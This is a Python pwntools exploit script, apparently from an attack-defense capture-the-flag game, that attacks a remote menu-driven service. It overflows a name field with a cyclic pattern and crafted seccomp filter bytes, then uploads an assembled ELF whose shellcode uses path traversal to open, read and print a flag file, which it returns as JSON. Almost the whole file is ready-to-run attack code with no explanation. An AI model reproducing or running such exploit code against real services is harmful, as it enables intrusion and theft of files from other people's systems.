#!/usr/bin/env python
import json
import string
import traceback
from pwn import *

context.timeout = 10
context.arch = 'amd64'
context.log_level = "error"
#context.terminal = ['tmux', 'neww']

r = None

def get_rand_str(length, charset=None):
    """Generate a random string of fixed length """
    if charset is None:
        charset = string.ascii_letters + string.digits
    return ''.join(random.choice(charset) for i in range(length))

def save():
    r.sendlineafter('>> ', '0')
    r.recvuntil('your tools at: ')
    place = r.recvline().strip()
    r.recvuntil('password: ')
    passwd = r.recvline().strip()
    return place, passwd

def load(place, passwd):
    r.sendlineafter('>> ', '1')
    r.sendlineafter('>> ', place)
    r.sendlineafter('>> ', passwd)

def bring(idx, height=-1):
    assert 0 <= idx <= 3
    r.sendlineafter('>> ', '2')
    r.sendlineafter('>> ', str(idx))
    if idx == 0:
        r.sendlineafter('>> ', str(height))

def show():
    r.sendlineafter('>> ', '3')

def rename(name):
    r.sendlineafter('>> ', '4')
    r.sendlineafter('>> ', name)

def attempt(use):
    r.sendlineafter('>> ', '5')
    r.sendlineafter('>> ', str(use))

def upload_bin(path):
    with open(path, 'rb') as f:
        content = f.read()
    r.sendlineafter('>> ', str(len(content)))
    r.sendlineafter('>> ', content)

def checked_bring(idx):
    choice = random.randint(0, 1)

    if idx != 0:
        bring(idx)
        assert "How high do you want it to be?" not in r.recvline()
        return None

    r.sendlineafter('>> ', '2')
    r.sendlineafter('>> ', str(idx))
    assert "How high do you want it to be?" in r.recvline()
    if choice:
        r.sendlineafter(">> ", str(-1))
        assert 'You are a cheater' in r.recvline()
        return None
    else:
        val = random.randint(0, 0xffff)
        r.sendlineafter('>> ', str(val))
        return val

def get_elf(payload):
    path = tempfile.mktemp()
    e = ELF.from_assembly(payload)
    e.save(path)
    with open(path, 'rb') as f:
        content = f.read()
    os.system('rm "%s"' % path)
    return content

def exploit(path):
    seccomp_rules = ' \x00\x00\x00\x00\x00\x00\x00\x15\x00\x00\x01\x03\x00\x00\x00\x06\x00\x00\x00\x01\x00\x05\x00\x06\x00\x00\x00\x00\x00\xff\x7f'
    rename(cyclic(100)+seccomp_rules)
    
    bring(0)
    bring(1)
    attempt(1)
    
    payload = shellcraft.amd64.linux.openat(2, '../../..%s\x00' % path) +\
              shellcraft.linux.read('rax', 'rsp', 0x100) +\
              shellcraft.linux.write(1, 'rsp', 0x100)

    content = get_elf(payload)
    r.sendlineafter('>> ', str(len(content)))
    r.send(content)
    r.recvline()
    r.recvline()
    flag = r.recvline().strip()

    print(json.dumps({'payload' : {'flag' : flag}, 'error' : 0, 'error_msg' : ''}))

if __name__ == "__main__":
    IP = sys.argv[1]
    PORT = sys.argv[2]
    FLAG_ID = sys.argv[3]
    r = remote(IP, PORT)

    path = os.path.join("/home/chall/service/append/", FLAG_ID)
    exploit(path)
